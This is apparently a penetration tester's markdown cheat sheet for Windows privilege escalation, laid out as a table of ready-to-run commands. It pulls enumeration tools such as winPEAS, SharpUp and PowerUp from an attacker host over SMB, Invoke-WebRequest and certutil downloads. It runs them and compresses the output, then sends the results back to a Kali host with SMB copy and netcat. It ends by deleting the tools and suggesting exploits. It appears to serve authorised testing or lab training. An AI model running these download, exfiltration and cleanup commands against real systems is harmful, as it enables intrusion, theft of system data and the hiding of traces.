# Windows
## Setup Utilities / Run Tools / Compress Results
| Command Type     | Description               | Command                                         |
|:-----------------|:-------------------------:| -----------------------------------------------:|
| Varible          | Set LHOST to save time    | `set LHOST=192.168.119.127` |\
| Variable (PowerShell) | Set LHOST to save time | `$env:LHOST = '10.10.14.18'` |
| Copy             | Copy Utilities locally (Dos)   | `copy \\%LHOST%\share\windows\privesc\privesc.7z .` |
| Copy             | Copy Utilities locally (Dos)   | `copy \\%LHOST%\share\windows\privesc\7za.exe .` |
| Copy (PowerShell) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\privesc.7z .` |
| Copy (PowerShell) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\7za.exe .` |
| Copy (PowerShell) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\winPEASx64.exe .` |
| Copy (PowerShell) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\SharpUp.exe .` |
| Copy (PowerShell) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\PowerUp.ps1 .` |
| Copy | Copy Utilities locally (PowerShell) | `Invoke-WebRequest http://$env:LHOST/windows/privesc/7za.exe -OutFile 7za.exe` | 
| Copy | Copy Utilities locally (PowerShell) | `Invoke-WebRequest http://$env:LHOST/windows/privesc/privesc.7z -OutFile prives.7z` | 
| Copy | Copy Utilities locally (PowerShell) | `Invoke-WebRequest http://$env:LHOST/windows/privesc/winPEASx64.exe -OutFile winPEASx64.exe` | 
| Copy             | RDP Mapped drive   | `xcopy /E \\TSCLIENT\linux\* .` |
| CertUtil         | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/privesc.7z privesc.7z` |
| CertUtil         | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/7za.exe 7za.exe` |
| CertUtil         | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/winPEASx64.exe winPEASx64.exe`
| CertUtil         | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/winPEASx86.exe winPEASx86.exe`
| Extract Archive  | 7zip extract              | `7za.exe x privesc.7z` |
| Priv Check       | All in One    | `winPEAS.exe > winPEAS.txt & SharpUp.exe > SharpUp.txt & windows-privesc-check2.exe --audit -a -o wpc-report & WinPrivCheck.bat > WinPrivCheck.txt & systeminfo > systeminfo.txt` |
| Compress         | Compress txt file results | `7za a -t7z privesc.7z *.txt` | 
| Send to host | Send results to Kali SMB | `copy privesc.7z \\192.168.119.127\share` | 
| Send to host     | Send results to Kali host | `nc %LHOST% 235 < privesc.7z`
| Cleanup | Remove utilities | `del *.zip *.exe *.py *.ps1 *.bat *.dll` |
| Cleanup | Copy files to Kali host | `copy * \\%LHOST%\share` | 
| Exploits | Exploit Suggester | `/root/share/windows/privesc/windows-exploit-suggester.py -d /root/share/windows/privesc/2021-01-21-mssb.xls -i privesc/systeminfo.txt`